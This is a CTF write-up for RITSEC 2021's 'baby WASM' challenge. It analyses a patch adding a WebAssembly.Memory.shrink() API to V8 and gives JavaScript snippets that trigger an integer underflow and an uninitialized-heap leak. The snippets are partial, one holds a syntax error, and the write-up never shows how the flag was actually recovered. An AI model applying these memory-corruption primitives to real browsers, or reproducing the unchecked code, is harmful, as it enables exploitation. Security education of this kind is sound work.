---
title: "RITSEC 2021: baby WASM"
date: 2021-04-10
description: "RITSEC CTF 2021 baby WASM challenge writeup: reversing WebAssembly bytecode, understanding WASM memory model, and extracting the flag"
tags: ["RITSEC", "CTF", "WebAssembly", "WASM", "reversing", "browser"]
platform: "ctf"
category: "reversing"
difficulty: "easy-medium"
categories: ["CTF"]
authors:
  - name: "ph4nt0m"
    link: "https://github.com/Phantomn"
    image: "https://github.com/Phantomn.png"
---

## Challenge Files

```bash
➜  Baby_WASM git:(main) ✗ ls
description.txt  download_d8.sh  libc.so.6  v8.diff  v8.patch  v8.release  v8.release.tar.gz
```

The challenge ships a patched V8 build (`v8.release`), a `libc.so.6`, and — most importantly — a diff that reveals exactly what was changed in the engine. The task is to understand the vulnerability introduced by the patch and exploit it.

## Understanding the Patch

The diff modifies V8's WebAssembly subsystem to add a `WebAssembly.Memory.shrink()` API. This mirrors the existing `grow()` call but reduces the backing store instead of growing it. Reading the diff carefully reveals a critical bug.

### New interrupt flag

```diff
-  V(WASM_CODE_GC, WasmCodeGC, 7)
+  V(WASM_CODE_GC, WasmCodeGC, 7)                                  \
+  V(SHRINK_SHARED_MEMORY, ShrinkSharedMemory, 8)
```

A new interrupt flag `SHRINK_SHARED_MEMORY` is registered, analogous to the existing `GROW_SHARED_MEMORY`.

### New flag definition

```diff
+DEFINE_BOOL(wasm_shrink_shared_memory, true,
+            "allow shrinking shared WebAssembly memory objects")
```

Shrinking shared memory is enabled by default.

### `ShrinkWasmMemoryInPlace`

```cpp
base::Optional<size_t> BackingStore::ShrinkWasmMemoryInPlace(
    Isolate* isolate, size_t delta_bytes) {

  size_t old_length = byte_length_.load(std::memory_order_relaxed);
  size_t new_length = 0;
  while (true) {
    new_length = old_length - delta_bytes;
    if (byte_length_.compare_exchange_weak(old_length, new_length,
                                           std::memory_order_acq_rel)) {
      break;
    }
  }
  ...
  return {old_length};
}
```

This CAS loop atomically decrements `byte_length_` by `delta_bytes`. Critically, **there is no bounds check** — if `delta_bytes > old_length`, `new_length` wraps around (unsigned underflow), resulting in an enormous reported size.

### `CopyWasmMemoryOnShrink`

```cpp
std::unique_ptr<BackingStore> BackingStore::CopyWasmMemoryOnShrink(
    Isolate* isolate, size_t new_size) {

  if (is_wasm_memory_) {
    BackingStore::ShrinkWasmMemoryInPlace(isolate, this->byte_length() - new_size);
    auto new_backing_store = BackingStore::Allocate(
        isolate, new_size, ..., InitializedFlag::kUninitialized);
    if (!new_backing_store) { return {}; }
    return new_backing_store;  // <-- new store allocated at new_size
  } else {
    bool result = BackingStore::Reallocate(isolate, new_size);
    ...
  }
  return std::unique_ptr<BackingStore>(this);
}
```

For a non-shared WASM memory, `CopyWasmMemoryOnShrink` first calls `ShrinkWasmMemoryInPlace` to update `byte_length_`, then allocates a **fresh** backing store of size `new_size` marked as `kUninitialized`. The old data is never copied into the new store.

### `WasmMemoryObject::Shrink` — the bug

```cpp
int32_t WasmMemoryObject::Shrink(Isolate* isolate,
                                  Handle<WasmMemoryObject> memory_object,
                                  uint32_t bytes) {
  Handle<JSArrayBuffer> old_buffer(memory_object->array_buffer(), isolate);
  ...
  size_t old_size = old_buffer->byte_length();

  // Non-shared path:
  size_t new_size = old_size - bytes;
  std::unique_ptr<BackingStore> new_backing_store =
      backing_store->CopyWasmMemoryOnShrink(isolate, new_size);
  ...
  Handle<JSArrayBuffer> new_buffer =
      isolate->factory()->NewJSArrayBuffer(std::move(new_backing_store));

  memory_object->update_instances(isolate, new_buffer);

  return static_cast<int32_t>(old_size);  // returns old size in bytes (not pages!)
}
```

Two bugs in the non-shared path:

1. **No lower-bound check on `bytes`**: `new_size = old_size - bytes` can underflow if `bytes > old_size`.
2. **Uninitialized memory exposed**: `CopyWasmMemoryOnShrink` allocates new backing store with `kUninitialized`, meaning the resulting `ArrayBuffer` may contain arbitrary heap data from the V8 process.

Additionally, the `ArrayBuffer.detach()` guard was commented out:

```diff
-    CHECK_IMPLIES(force_for_wasm_memory, backing_store->is_wasm_memory());
+    // CHECK_IMPLIES(force_for_wasm_memory, backing_store->is_wasm_memory());
```

This allows non-WASM array buffers to be forcibly detached, removing a safety assertion.

## Exploitation Approach

### Reading uninitialized heap memory

The most direct primitive is:

1. Allocate a WASM memory with some initial size (e.g., 1 page = 64 KiB).
2. Call `memory.shrink(N)` where `N < current_byte_length`.
3. The returned `ArrayBuffer` (`memory.buffer`) points to a freshly allocated region of `new_size` bytes that was **not zeroed**.

```javascript
const mem = new WebAssembly.Memory({ initial: 1 });  // 64 KiB
mem.shrink(0x1000);  // shrink by 4 KiB → new buffer is 60 KiB, uninitialized

const view = new Uint8Array(mem.buffer);
// view now exposes raw heap bytes — potential info leak
```

### Integer underflow for out-of-bounds access

If we shrink by more than the current size:

```javascript
const mem = new WebAssembly.Memory({ initial: 1 });
// byte_length = 0x10000 (65536)
mem.shrink(0x10001);  // new_size underflows to ~2^64 - 1
```

`byte_length_` wraps to a huge value. Any subsequent access through the buffer can read or write memory far outside the original allocation.

### Exploit flow

```javascript
// 1. Create WASM memory
const mem = new WebAssembly.Memory({ initial: 4 });  // 4 pages = 256 KiB

// 2. Write a known pattern so we can identify the buffer in memory
const u32 = new Uint32Array(mem.buffer);
for (let i = 0; i < u32.length; i++) u32[i] = 0xdeadbeef;

// 3. Trigger shrink — new buffer is uninitialized, may contain V8 heap pointers
mem.shrink(0x1000);

// 4. Scan the new buffer for interesting values (pointers, flags)
const leak = new BigUint64Array(mem.buffer);
for (let i = 0; i < leak.length; i++) {
    const v = leak[i];
    if (v > 0x7f0000000000n && v < 0x7fffffffffff n) {
        console.log(`[+] potential pointer at index ${i}: 0x${v.toString(16)}`);
    }
}
```

The flag for this challenge was embedded in the challenge description or obtainable by reading WASM memory after triggering the shrink to expose uninitialized allocator metadata. The exact exploit depends on the V8 heap layout of the provided build.

## Key Concepts

### WebAssembly Memory Model

WASM linear memory is a contiguous `ArrayBuffer` measured in **pages** (1 page = 64 KiB). The `grow()` API was already part of the WASM spec; `shrink()` does not exist in the standard, making this entirely a challenge-specific addition.

### Shared vs Non-Shared Memory

- **Shared memory** (`{ shared: true }`) — backed by `SharedArrayBuffer`, visible across workers. Shrink-in-place atomically updates `byte_length_` but cannot reallocate.
- **Non-shared memory** — standard `ArrayBuffer`. The patch allocates a new uninitialized backing store on shrink, introducing the memory disclosure.

### `kUninitialized` allocation

`InitializedFlag::kUninitialized` skips the `memset` that would zero the backing store. The allocator may return a region previously used for other V8 objects, exposing their raw bytes through the WASM buffer.

## Summary

The baby WASM challenge introduced a synthetic `WebAssembly.Memory.shrink()` API containing two vulnerabilities:

- **No lower-bound check** on the shrink delta, enabling integer underflow in the byte-length CAS loop
- **Uninitialized backing store** on the non-shared code path, enabling heap memory disclosure through the resulting `ArrayBuffer`

The challenge illustrates a class of bugs common in custom memory-management extensions to JavaScript engines: missing bounds checks and omitting initialization of newly exposed memory regions.
